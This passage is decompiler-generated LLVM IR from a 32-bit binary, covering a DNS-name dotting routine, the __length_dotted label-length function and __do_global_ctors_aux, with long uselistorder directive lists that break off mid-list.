dec_label_pc_8050849:                             ; preds = %dec_label_pc_8050830
  %v4_8050854 = add i32 %v3_805083a, %v4_805083a
  store i32 %v4_8050854, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_80508c037.in, 64
  %v1_8050857 = zext i8 %tmp to i32
  %v2_805085a = add i32 %v1_8050837, %arg1
  %v3_805085a = inttoptr i32 %v2_805085a to i8*
  %v4_805085a = load i8, i8* %v3_805085a, align 1
  %v5_805085a = zext i8 %v4_805085a to i32
  %v2_805085e = mul nuw nsw i32 %v1_8050857, 256
  %v2_8050863 = or i32 %v5_805085a, %v2_805085e
  store i32 %v2_8050863, i32* @edx, align 4
  store i32 %v1_8050889.ph47, i32* @ecx, align 4
  %v2_80508c0 = add i32 %v2_8050863, %arg1
  %v3_80508c0 = inttoptr i32 %v2_80508c0 to i8*
  %v4_80508c0 = load i8, i8* %v3_80508c0, align 1
  %v1_80508c4 = icmp eq i8 %v4_80508c0, 0
  %v1_80508c6 = icmp eq i1 %v1_80508c4, false
  br i1 %v1_80508c6, label %dec_label_pc_8050830, label %dec_label_pc_80508cc

dec_label_pc_805086c:                             ; preds = %dec_label_pc_8050830
  %v2_805086c = add i32 %v5_80508c037, %v1_8050889.ph47
  %v1_8050875 = add i32 %v2_805086c, 1
  store i32 %v1_8050875, i32* @edi, align 4
  %v10_8050876 = icmp ult i32 %v1_8050875, %arg4
  %v1_805087a = icmp eq i1 %v10_8050876, false
  br i1 %v1_805087a, label %dec_label_pc_80508d8, label %dec_label_pc_805087c

dec_label_pc_805087c:                             ; preds = %dec_label_pc_805086c
  %v2_8050882 = add i32 %v1_8050837, %arg1
  %v2_8050889 = add i32 %v1_8050889.ph47, %arg3
  %v3_805088c = inttoptr i32 %v2_8050889 to i16*
  %v4_805088c = call i32 @memcpy(i16* %v3_805088c, i32 %v2_8050882, i32 %v5_80508c037)
  %v0_8050894 = load i32, i32* @esi, align 4
  %v2_8050894 = add i32 %v0_8050894, %v5_80508c037
  store i32 %v2_8050894, i32* @edx, align 4
  br i1 %v8_805083038, label %dec_label_pc_80508a0, label %dec_label_pc_805089e

dec_label_pc_805089e:                             ; preds = %dec_label_pc_805087c
  %v0_805089e = load i32, i32* %ebp.global-to-local, align 4
  %v2_805089e = add i32 %v0_805089e, %v5_80508c037
  store i32 %v2_805089e, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80508a0

dec_label_pc_80508a0:                             ; preds = %dec_label_pc_805087c, %dec_label_pc_805089e
  %v4_80508b7 = add i32 %v2_805086c, %arg3
  %v5_80508b7 = inttoptr i32 %v4_80508b7 to i8*
  store i8 46, i8* %v5_80508b7, align 1
  %v0_80508ba.pre = load i32, i32* @edi, align 4
  %v1_80508c0.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_80508ba.pre, i32* @ecx, align 4
  %v2_80508c027 = add i32 %v1_80508c0.pre.pre, %arg1
  %v3_80508c028 = inttoptr i32 %v2_80508c027 to i8*
  %v4_80508c029 = load i8, i8* %v3_80508c028, align 1
  %v1_80508c431 = icmp eq i8 %v4_80508c029, 0
  %v1_80508c632 = icmp eq i1 %v1_80508c431, false
  %v8_805083033 = icmp eq i8 %stack_var_-17.136, 0
  %v0_805083a.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_80508c632, label %dec_label_pc_8050830.lr.ph, label %dec_label_pc_80508cc

dec_label_pc_8050830.lr.ph:                       ; preds = %dec_label_pc_80508a0, %dec_label_pc_8050822
  %v0_805083a.pre = phi i32 [ 0, %dec_label_pc_8050822 ], [ %v0_805083a.pre.pre, %dec_label_pc_80508a0 ]
  %v8_80508303350 = phi i1 [ false, %dec_label_pc_8050822 ], [ %v8_805083033, %dec_label_pc_80508a0 ]
  %v5_80508c03049.in = phi i8 [ %v4_80508c02942, %dec_label_pc_8050822 ], [ %v4_80508c029, %dec_label_pc_80508a0 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_8050822 ], [ %stack_var_-17.136, %dec_label_pc_80508a0 ]
  %v1_8050889.ph47 = phi i32 [ 0, %dec_label_pc_8050822 ], [ %v0_80508ba.pre, %dec_label_pc_80508a0 ]
  %v0_8050837.ph46 = phi i32 [ %arg2, %dec_label_pc_8050822 ], [ %v1_80508c0.pre.pre, %dec_label_pc_80508a0 ]
  br label %dec_label_pc_8050830

dec_label_pc_80508cc:                             ; preds = %dec_label_pc_80508a0, %dec_label_pc_8050849, %dec_label_pc_8050822
  %v0_80508d1 = phi i32 [ 0, %dec_label_pc_8050822 ], [ %v4_8050854, %dec_label_pc_8050849 ], [ %v0_805083a.pre.pre, %dec_label_pc_80508a0 ]
  %v8_8050830.lcssa = phi i1 [ false, %dec_label_pc_8050822 ], [ true, %dec_label_pc_8050849 ], [ %v8_805083033, %dec_label_pc_80508a0 ]
  %v2_80508d3 = zext i1 %v8_8050830.lcssa to i32
  %v3_80508d3 = add i32 %v0_80508d1, 1
  %v4_80508d3 = add i32 %v3_80508d3, %v2_80508d3
  br label %dec_label_pc_80508db

dec_label_pc_80508d8:                             ; preds = %dec_label_pc_805086c, %entry
  br label %dec_label_pc_80508db

dec_label_pc_80508db:                             ; preds = %dec_label_pc_80508cc, %dec_label_pc_80508d8
  %storemerge = phi i32 [ %v4_80508d3, %dec_label_pc_80508cc ], [ -1, %dec_label_pc_80508d8 ]
  store i32 %v0_805080e, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050889.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_80508c0, { 1, 0 }
  uselistorder i32 %v2_8050863, { 0, 2, 1 }
  uselistorder i32 %v4_8050854, { 0, 2, 1 }
  uselistorder i32 %v5_80508c037, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i8 1, { 0, 4, 7, 1, 6, 5, 2, 3 }
  uselistorder i8 46, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 2, 3, 4, 5, 6, 7, 8, 15, 10, 11, 16, 17, 18, 0, 1, 9, 12, 13, 14, 19 }
  uselistorder i32* @edi, { 2, 90, 91, 22, 92, 93, 94, 21, 95, 96, 97, 98, 3, 99, 0, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 26, 5, 4, 27, 28, 29, 30, 31, 39, 32, 33, 34, 35, 36, 37, 38, 115, 6, 116, 7, 117, 118, 119, 120, 125, 126, 1, 121, 122, 123, 124, 127, 128, 129, 130, 211, 8, 212, 213, 214, 131, 132, 139, 140, 141, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 186, 47, 48, 49, 50, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 9, 226, 227, 228, 229, 230, 231, 232, 268, 269, 10, 270, 271, 11, 274, 275, 276, 277, 278, 51, 52, 53, 279, 280, 281, 282, 283, 284, 285, 295, 296, 12, 297, 298, 299, 40, 41, 42, 43, 44, 45, 46, 54, 13, 55, 56, 187, 197, 198, 199, 200, 201, 188, 189, 190, 191, 192, 193, 194, 195, 196, 57, 58, 59, 60, 61, 62, 63, 173, 174, 175, 176, 177, 178, 179, 180, 14, 181, 182, 183, 184, 185, 202, 203, 15, 204, 205, 206, 207, 208, 209, 210, 233, 234, 16, 235, 293, 294, 236, 237, 238, 17, 150, 151, 142, 143, 144, 145, 146, 147, 148, 149, 64, 65, 66, 152, 153, 154, 239, 240, 241, 242, 243, 244, 245, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 18, 260, 23, 24, 25, 246, 19, 247, 248, 289, 290, 291, 292, 155, 156, 157, 158, 159, 160, 261, 262, 263, 264, 133, 134, 135, 136, 137, 138, 272, 273, 83, 84, 286, 287, 288, 67, 20, 68, 69, 70, 71, 171, 172, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 85, 86, 87, 88, 89, 265, 266, 267 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 6, 7, 44, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 43, 18, 19, 20, 23, 21, 22, 24, 25, 26, 39, 40, 27, 41, 45, 50, 46, 28, 29, 51, 30, 31, 0, 48, 49, 42, 32, 53, 33, 34, 35, 36, 37, 38, 47, 52 }
  uselistorder i8 64, { 0, 5, 3, 4, 6, 7, 1, 2 }
  uselistorder i32* @edx, { 5, 72, 73, 74, 75, 76, 77, 78, 79, 19, 2, 83, 81, 82, 1, 84, 85, 86, 87, 88, 89, 90, 91, 22, 26, 23, 24, 25, 92, 93, 94, 95, 96, 97, 98, 104, 99, 100, 101, 102, 103, 3, 20, 198, 199, 200, 201, 202, 203, 204, 246, 247, 105, 106, 117, 107, 4, 121, 122, 124, 125, 170, 6, 31, 205, 206, 108, 109, 7, 110, 111, 112, 207, 208, 209, 210, 211, 212, 249, 250, 251, 252, 8, 253, 254, 256, 257, 171, 258, 259, 172, 32, 27, 28, 260, 29, 261, 262, 263, 123, 265, 266, 268, 267, 269, 60, 9, 61, 62, 63, 64, 65, 66, 67, 270, 271, 272, 273, 274, 30, 175, 185, 10, 186, 187, 188, 189, 190, 191, 176, 177, 178, 179, 180, 181, 182, 11, 183, 184, 173, 174, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 12, 49, 50, 51, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 13, 163, 164, 165, 166, 167, 168, 169, 192, 193, 195, 196, 197, 80, 194, 57, 213, 113, 114, 115, 52, 116, 214, 215, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 18, 233, 234, 216, 235, 14, 236, 237, 239, 15, 240, 241, 242, 243, 244, 21, 16, 238, 264, 118, 119, 120, 17, 245, 255, 248, 0, 53, 70, 54, 55, 56, 58, 59, 68, 69, 71, 275 }
  uselistorder i32* @esi, { 105, 106, 107, 108, 109, 110, 35, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 36, 40, 41, 10, 7, 47, 42, 43, 44, 45, 46, 131, 11, 132, 133, 137, 134, 135, 136, 144, 138, 139, 140, 141, 142, 143, 145, 146, 147, 148, 149, 150, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 12, 250, 251, 13, 158, 159, 160, 14, 161, 162, 163, 164, 187, 188, 189, 190, 191, 192, 1, 193, 194, 195, 196, 197, 198, 199, 200, 56, 57, 58, 59, 60, 314, 315, 316, 317, 217, 218, 252, 253, 254, 255, 0, 256, 318, 319, 320, 321, 322, 61, 62, 63, 323, 324, 325, 326, 327, 335, 336, 337, 338, 350, 351, 352, 353, 354, 355, 356, 328, 333, 334, 48, 49, 50, 51, 64, 65, 66, 2, 67, 68, 69, 52, 53, 54, 55, 219, 228, 15, 229, 230, 223, 224, 225, 226, 227, 220, 221, 222, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 201, 202, 203, 204, 205, 206, 207, 3, 208, 209, 210, 211, 16, 212, 37, 213, 214, 215, 216, 231, 232, 233, 236, 237, 238, 239, 339, 17, 340, 341, 257, 18, 258, 38, 32, 234, 235, 98, 99, 357, 358, 348, 349, 259, 260, 261, 262, 263, 264, 265, 175, 19, 8, 165, 169, 170, 171, 172, 20, 33, 173, 174, 166, 167, 168, 85, 21, 86, 87, 176, 22, 177, 178, 266, 267, 268, 269, 24, 270, 4, 272, 273, 274, 275, 23, 276, 277, 271, 278, 279, 280, 281, 5, 282, 283, 284, 285, 286, 287, 34, 25, 288, 289, 26, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 27, 307, 308, 309, 28, 39, 290, 6, 291, 292, 329, 330, 331, 332, 342, 343, 344, 345, 346, 347, 179, 180, 181, 182, 29, 183, 184, 185, 186, 310, 311, 312, 313, 151, 152, 153, 154, 155, 30, 31, 156, 157, 100, 101, 88, 89, 90, 91, 92, 93, 94, 95, 9, 96, 97, 102, 103, 104, 359 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_80508db, { 1, 0 }
  uselistorder label %dec_label_pc_80508a0, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80508f2 = icmp eq i32 %arg1, 0
  br i1 %v1_80508f2, label %dec_label_pc_8050921, label %dec_label_pc_8050912.preheader

dec_label_pc_8050912.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_805091210 = add i32 %arg2, %arg1
  %v3_805091211 = inttoptr i32 %v2_805091210 to i8*
  %v4_805091212 = load i8, i8* %v3_805091211, align 1
  %v1_805091614 = add i32 %arg2, 1
  %v1_805091915 = icmp eq i8 %v4_805091212, 0
  %v1_805091b16 = icmp eq i1 %v1_805091915, false
  br i1 %v1_805091b16, label %dec_label_pc_8050901, label %dec_label_pc_805091d

dec_label_pc_80508f8:                             ; preds = %dec_label_pc_8050901
  %v1_80508f8 = add i32 %v0_80508f817, 2
  br label %dec_label_pc_805091d

dec_label_pc_8050901:                             ; preds = %dec_label_pc_8050912.preheader, %dec_label_pc_8050912
  %v1_805091619 = phi i32 [ %v1_8050916, %dec_label_pc_8050912 ], [ %v1_805091614, %dec_label_pc_8050912.preheader ]
  %v5_805091218.in = phi i8 [ %v4_8050912, %dec_label_pc_8050912 ], [ %v4_805091212, %dec_label_pc_8050912.preheader ]
  %v0_80508f817 = phi i32 [ %v2_805090f, %dec_label_pc_8050912 ], [ %arg2, %dec_label_pc_8050912.preheader ]
  %v5_805091218 = zext i8 %v5_805091218.in to i32
  %v1_8050903 = and i32 %v5_805091218, 192
  %v6_8050908 = icmp eq i32 %v1_8050903, 192
  %v2_805090f = add i32 %v5_805091218, %v1_805091619
  br i1 %v6_8050908, label %dec_label_pc_80508f8, label %dec_label_pc_8050912

dec_label_pc_8050912:                             ; preds = %dec_label_pc_8050901
  store i32 %v2_805090f, i32* @ecx, align 4
  %v2_8050912 = add i32 %v2_805090f, %arg1
  %v3_8050912 = inttoptr i32 %v2_8050912 to i8*
  %v4_8050912 = load i8, i8* %v3_8050912, align 1
  %v1_8050916 = add i32 %v2_805090f, 1
  %v1_8050919 = icmp eq i8 %v4_8050912, 0
  %v1_805091b = icmp eq i1 %v1_8050919, false
  br i1 %v1_805091b, label %dec_label_pc_8050901, label %dec_label_pc_805091d

dec_label_pc_805091d:                             ; preds = %dec_label_pc_8050912.preheader, %dec_label_pc_8050912, %dec_label_pc_80508f8
  %v0_805091d = phi i32 [ %v1_80508f8, %dec_label_pc_80508f8 ], [ %v1_805091614, %dec_label_pc_8050912.preheader ], [ %v1_8050916, %dec_label_pc_8050912 ]
  %v2_805091f = sub i32 %v0_805091d, %arg2
  br label %dec_label_pc_8050921

dec_label_pc_8050921:                             ; preds = %entry, %dec_label_pc_805091d
  %v0_8050924 = phi i32 [ -1, %entry ], [ %v2_805091f, %dec_label_pc_805091d ]
  ret i32 %v0_8050924

; uselistorder directives
  uselistorder i8 %v4_8050912, { 1, 0 }
  uselistorder i32 %v2_805090f, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 2, { 92, 24, 93, 23, 55, 97, 98, 25, 29, 28, 94, 99, 100, 101, 82, 102, 103, 104, 105, 106, 107, 84, 30, 85, 86, 37, 108, 109, 31, 56, 38, 122, 39, 32, 123, 51, 110, 111, 112, 114, 83, 116, 117, 4, 44, 41, 124, 125, 52, 5, 45, 46, 53, 133, 42, 81, 3, 57, 78, 58, 79, 59, 80, 40, 6, 91, 26, 60, 61, 0, 62, 1, 63, 2, 64, 65, 7, 8, 9, 10, 87, 11, 12, 13, 47, 115, 14, 15, 54, 16, 66, 118, 119, 120, 121, 33, 48, 95, 96, 17, 134, 49, 34, 35, 126, 127, 43, 18, 19, 128, 27, 20, 129, 21, 50, 130, 131, 113, 132, 22, 68, 67, 88, 69, 89, 90, 70, 71, 72, 36, 73, 74, 76, 75, 77 }
  uselistorder i8 0, { 26, 3, 6, 7, 27, 5, 4, 71, 72, 73, 9, 80, 75, 76, 8, 78, 79, 77, 23, 81, 0, 1, 41, 42, 82, 83, 25, 84, 10, 12, 44, 43, 11, 28, 85, 86, 87, 125, 126, 15, 95, 91, 92, 90, 13, 93, 94, 14, 24, 96, 97, 107, 108, 109, 110, 111, 119, 120, 17, 46, 45, 16, 47, 48, 101, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 2, 143, 144, 145, 170, 146, 171, 174, 65, 29, 37, 66, 18, 173, 121, 122, 123, 49, 112, 113, 114, 115, 116, 117, 30, 118, 74, 147, 148, 38, 149, 124, 55, 175, 102, 103, 98, 100, 99, 150, 151, 152, 153, 154, 155, 156, 19, 157, 158, 20, 159, 160, 161, 162, 163, 164, 165, 166, 39, 172, 104, 105, 106, 167, 88, 89, 52, 50, 51, 53, 54, 56, 57, 58, 60, 59, 21, 61, 62, 63, 64, 67, 68, 69, 70, 168, 169, 22, 40, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* @ecx, { 24, 4, 6, 23, 5, 48, 51, 12, 52, 53, 54, 55, 13, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 34, 39, 35, 36, 37, 38, 72, 73, 7, 8, 40, 0, 74, 138, 199, 10, 16, 75, 76, 14, 9, 15, 77, 82, 83, 84, 85, 86, 107, 108, 109, 110, 1, 41, 139, 140, 28, 141, 79, 80, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 25, 167, 168, 169, 170, 171, 172, 26, 173, 22, 200, 201, 202, 203, 43, 44, 45, 46, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 17, 126, 111, 112, 113, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 18, 101, 102, 104, 105, 106, 103, 137, 49, 50, 29, 30, 78, 174, 175, 176, 177, 178, 179, 180, 27, 181, 11, 182, 183, 184, 185, 186, 19, 20, 2, 3, 187, 188, 21, 189, 190, 191, 192, 193, 195, 196, 197, 198, 32, 33, 194, 204, 81, 42, 31, 47 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050921, { 1, 0 }
  uselistorder label %dec_label_pc_805091d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050901, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805093c = load i32, i32* @global_var_8053be8.378, align 8
  %v10_8050941 = icmp eq i32 %v0_805093c, -1
  br i1 %v10_8050941, label %dec_label_pc_8050952, label %dec_label_pc_8050946.preheader

dec_label_pc_8050946.preheader:                   ; preds = %entry
  br label %dec_label_pc_8050946

dec_label_pc_8050946:                             ; preds = %dec_label_pc_8050946.preheader, %dec_label_pc_8050946
  %v4_8050949 = phi i32 [ %v0_805093c, %dec_label_pc_8050946.preheader ], [ %v2_805094b, %dec_label_pc_8050946 ]
  %v0_8050946 = phi i32 [ ptrtoint (i32* @global_var_8053be8.378 to i32), %dec_label_pc_8050946.preheader ], [ %v1_8050946, %dec_label_pc_8050946 ]
  %v1_8050946 = add i32 %v0_8050946, -4
  call void @__pseudo_call(i32 %v4_8050949)
  %v1_805094b = inttoptr i32 %v1_8050946 to i32*
  %v2_805094b = load i32, i32* %v1_805094b, align 4
  %v10_805094d = icmp eq i32 %v2_805094b, -1
  %v1_8050950 = icmp eq i1 %v10_805094d, false
  br i1 %v1_8050950, label %dec_label_pc_8050946, label %dec_label_pc_8050952.loopexit

dec_label_pc_8050952.loopexit:                    ; preds = %dec_label_pc_8050946
  %v2_8050952.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8050952

dec_label_pc_8050952:                             ; preds = %dec_label_pc_8050952.loopexit, %entry
  %v2_8050952 = phi i32 [ %v2_8050952.pre, %dec_label_pc_8050952.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_8050952

; uselistorder directives
  uselistorder i32 %v0_805093c, { 1, 0 }
  uselistorder i1 false, { 426, 181, 2, 0, 1, 4, 182, 184, 183, 3, 186, 185, 187, 25, 6, 26, 196, 191, 195, 193, 194, 34, 188, 189, 192, 5, 197, 198, 199, 200, 57, 59, 60, 61, 62, 58, 63, 64, 65, 68, 66, 67, 201, 202, 207, 27, 203, 204, 206, 205, 208, 209, 214, 213, 210, 211, 212, 7, 8, 70, 71, 72, 35, 215, 216, 217, 218, 219, 220, 311, 312, 313, 221, 28, 222, 223, 314, 315, 316, 224, 427, 428, 29, 10, 227, 228, 229, 230, 232, 231, 9, 247, 248, 30, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 282, 283, 285, 284, 11, 73, 74, 75, 76, 317, 318, 319, 286, 287, 240, 241, 242, 320, 321, 322, 323, 324, 325, 326, 45, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 429, 430, 32, 354, 36, 355, 356, 357, 288, 289, 290, 431, 432, 444, 445, 446, 447, 448, 451, 37, 452, 453, 450, 443, 433, 53, 454, 455, 456, 457, 458, 459, 460, 461, 161, 162, 163, 164, 165, 166, 12, 462, 463, 33, 77, 13, 78, 79, 175, 69, 436, 437, 438, 439, 440, 441, 442, 298, 299, 300, 301, 302, 303, 292, 293, 294, 295, 296, 297, 291, 80, 81, 82, 83, 84, 85, 86, 87, 88, 266, 267, 268, 269, 270, 271, 272, 273, 23, 275, 274, 279, 276, 277, 278, 14, 280, 281, 304, 305, 307, 308, 449, 190, 358, 359, 360, 38, 361, 15, 306, 130, 464, 362, 363, 245, 243, 244, 16, 31, 233, 238, 237, 39, 239, 235, 234, 40, 236, 89, 246, 90, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 383, 382, 17, 384, 385, 386, 387, 388, 390, 24, 391, 389, 392, 394, 393, 18, 395, 396, 398, 397, 41, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 54, 55, 434, 42, 435, 19, 249, 250, 251, 252, 253, 423, 225, 226, 91, 92, 93, 94, 95, 106, 107, 48, 96, 97, 98, 20, 21, 99, 100, 101, 102, 103, 104, 105, 43, 49, 46, 108, 109, 110, 111, 112, 113, 114, 115, 50, 116, 119, 117, 118, 120, 121, 122, 123, 51, 124, 52, 125, 126, 127, 128, 129, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 147, 144, 145, 146, 22, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 167, 168, 169, 170, 171, 47, 172, 173, 174, 176, 177, 178, 179, 180, 309, 310, 424, 425, 56, 44, 465 }
  uselistorder void (i32)* @__pseudo_call, { 4, 3, 6, 7, 8, 9, 5, 1, 2, 0 }
  uselistorder i32 -4, { 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 8, 23, 37, 38, 39, 40, 53, 55, 56, 57, 4, 54, 1, 52, 24, 41, 5, 42, 43, 44, 9, 46, 47, 48, 49, 50, 51, 10, 58, 59, 60, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 6, 0, 36, 45, 2, 7, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8053be8.378 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 27, 28, 60, 9, 153, 167, 14, 283, 61, 168, 62, 169, 284, 63, 64, 170, 65, 29, 19, 66, 22, 171, 172, 30, 31, 32, 69, 68, 67, 173, 120, 121, 18, 17, 16, 174, 175, 70, 176, 4, 285, 177, 286, 287, 178, 179, 288, 154, 71, 180, 303, 181, 182, 183, 72, 184, 0, 185, 186, 187, 188, 155, 189, 33, 190, 290, 35, 291, 36, 292, 293, 191, 140, 141, 142, 132, 134, 135, 136, 137, 138, 139, 133, 5, 131, 122, 192, 128, 129, 130, 143, 144, 127, 145, 146, 147, 148, 149, 150, 151, 123, 126, 34, 194, 193, 58, 6, 195, 196, 296, 297, 37, 15, 73, 197, 55, 198, 304, 199, 74, 75, 200, 76, 201, 156, 202, 77, 203, 204, 152, 79, 78, 205, 206, 207, 81, 80, 82, 208, 209, 10, 210, 211, 83, 84, 212, 56, 57, 213, 85, 86, 214, 87, 215, 88, 216, 89, 217, 90, 218, 91, 219, 92, 220, 93, 221, 94, 222, 95, 223, 96, 224, 97, 225, 98, 226, 99, 227, 100, 228, 38, 229, 59, 101, 102, 230, 231, 232, 233, 234, 235, 104, 103, 157, 164, 1, 105, 236, 106, 237, 20, 238, 158, 239, 309, 240, 241, 39, 298, 40, 242, 294, 43, 42, 44, 45, 23, 46, 107, 47, 243, 41, 295, 7, 299, 302, 108, 244, 305, 245, 246, 300, 301, 247, 281, 282, 311, 312, 248, 310, 109, 249, 21, 250, 251, 252, 11, 253, 12, 306, 307, 13, 254, 255, 308, 3, 48, 49, 2, 256, 165, 166, 257, 258, 8, 124, 125, 110, 289, 259, 111, 260, 112, 261, 113, 262, 114, 263, 115, 264, 116, 265, 117, 266, 118, 267, 119, 268, 159, 275, 160, 276, 269, 277, 161, 278, 270, 162, 279, 50, 280, 24, 25, 26, 51, 52, 53, 271, 272, 273, 274, 54, 163 }
  uselistorder i32 1, { 374, 699, 227, 615, 700, 219, 701, 160, 702, 253, 703, 704, 136, 705, 375, 26, 377, 376, 66, 211, 254, 255, 706, 229, 709, 342, 710, 711, 712, 228, 713, 240, 360, 67, 68, 714, 715, 379, 378, 169, 716, 380, 717, 381, 170, 718, 719, 382, 171, 172, 620, 621, 622, 623, 624, 625, 626, 627, 628, 386, 385, 384, 361, 383, 362, 30, 29, 28, 31, 629, 630, 388, 387, 363, 364, 127, 129, 128, 130, 132, 131, 285, 720, 721, 212, 284, 722, 723, 256, 724, 308, 725, 726, 389, 6, 0, 1, 730, 727, 728, 729, 230, 390, 63, 62, 731, 391, 133, 631, 632, 633, 257, 634, 732, 733, 734, 392, 176, 175, 173, 177, 174, 310, 735, 60, 258, 259, 37, 38, 36, 39, 260, 393, 32, 286, 241, 395, 394, 33, 34, 396, 178, 397, 58, 287, 288, 398, 289, 290, 261, 402, 401, 400, 399, 158, 312, 403, 213, 739, 740, 221, 741, 262, 231, 232, 742, 743, 220, 744, 745, 746, 747, 748, 263, 406, 405, 404, 764, 765, 766, 767, 768, 769, 770, 771, 218, 242, 772, 264, 773, 774, 775, 265, 776, 777, 266, 778, 779, 780, 781, 782, 313, 371, 408, 407, 51, 50, 52, 291, 292, 806, 807, 808, 809, 233, 635, 636, 637, 409, 48, 410, 825, 411, 43, 44, 293, 749, 365, 179, 309, 826, 827, 828, 267, 314, 829, 412, 830, 268, 831, 832, 424, 423, 422, 421, 420, 419, 418, 417, 416, 415, 414, 413, 180, 189, 186, 183, 187, 181, 185, 182, 184, 188, 833, 834, 2, 21, 20, 19, 18, 17, 425, 190, 191, 426, 12, 13, 835, 836, 427, 125, 124, 126, 876, 877, 878, 10, 11, 9, 837, 428, 89, 93, 94, 90, 92, 91, 838, 294, 431, 430, 429, 433, 432, 65, 434, 49, 435, 40, 437, 436, 42, 439, 438, 118, 441, 440, 154, 442, 198, 443, 166, 444, 199, 445, 200, 446, 201, 447, 449, 448, 41, 451, 450, 25, 453, 452, 27, 454, 64, 61, 456, 455, 59, 457, 461, 460, 459, 458, 123, 880, 881, 882, 464, 463, 462, 8, 7, 883, 295, 466, 465, 468, 467, 192, 296, 348, 614, 243, 474, 473, 472, 471, 470, 469, 56, 57, 886, 477, 476, 475, 55, 53, 54, 315, 478, 688, 689, 690, 343, 691, 479, 120, 121, 119, 122, 297, 298, 349, 249, 350, 351, 250, 352, 480, 481, 137, 138, 638, 214, 222, 639, 366, 482, 140, 142, 139, 141, 483, 73, 70, 69, 71, 75, 74, 72, 116, 113, 115, 117, 112, 114, 316, 485, 484, 317, 486, 318, 487, 319, 490, 489, 488, 353, 493, 492, 491, 193, 320, 816, 817, 818, 494, 168, 811, 812, 234, 813, 814, 815, 157, 155, 156, 354, 810, 269, 194, 196, 195, 321, 299, 640, 641, 642, 643, 497, 496, 495, 96, 95, 97, 322, 783, 784, 785, 786, 787, 788, 789, 790, 791, 270, 792, 793, 794, 795, 796, 302, 797, 798, 210, 303, 799, 800, 801, 802, 300, 301, 803, 804, 805, 500, 499, 498, 163, 162, 161, 165, 164, 355, 501, 502, 503, 504, 505, 506, 507, 508, 509, 819, 244, 820, 323, 251, 324, 824, 245, 514, 513, 512, 511, 510, 76, 77, 515, 516, 519, 518, 517, 78, 520, 707, 708, 839, 840, 372, 521, 79, 841, 821, 822, 823, 523, 522, 85, 84, 83, 661, 662, 525, 524, 47, 46, 45, 887, 888, 526, 24, 22, 23, 885, 527, 15, 14, 16, 528, 529, 752, 753, 754, 271, 149, 325, 326, 327, 751, 530, 328, 329, 750, 272, 3, 532, 531, 197, 330, 533, 167, 331, 534, 135, 304, 535, 111, 842, 843, 616, 274, 844, 845, 846, 847, 848, 850, 851, 852, 